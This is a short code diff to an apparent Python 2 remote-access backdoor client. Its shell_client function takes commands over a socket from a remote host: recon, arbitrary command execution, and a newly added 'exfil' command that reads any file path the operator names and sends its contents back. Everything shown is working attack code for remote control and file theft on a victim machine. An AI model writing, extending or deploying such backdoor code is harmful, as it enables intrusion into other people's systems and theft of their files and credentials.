@@ -5,6 +5,7 @@ import sys
 import time
 import base64
 import socket
+import os.path
 import urllib2
 import argparse
 import logging as log
@@ -55,6 +56,12 @@ def shell_client(host, port):
                 socksend(s, shell_recon())
             elif inp.startswith('shell '):
                 socksend(s, cmd_exec(inp[6:]).strip())
+            elif inp.startswith('exfil '):
+                try:
+                    with open(os.path.expanduser(inp[6:])) as f:
+                        socksend(s, f.read())
+                except IOError as e:
+                    socksend(s, e.strerror)
             else:
                 socksend(s, 'Unrecognized')
         except socket.error as e:
